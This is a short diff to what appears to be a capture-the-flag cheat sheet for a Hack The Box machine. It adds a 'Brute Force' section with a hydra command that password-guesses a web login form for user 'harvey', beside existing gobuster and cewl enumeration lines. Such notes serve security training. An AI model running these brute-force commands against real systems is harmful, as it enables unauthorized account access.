@@ -10,3 +10,7 @@ gobuster dir -u http://10.10.10.81/ -w /usr/share/wordlists/dirb/common.txt -t 6
 [+] Passwords
 ==============================================================================
 cewl http://10.10.10.10 
+==============================================================================
+[+] Brute Force
+==============================================================================
+ hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" 
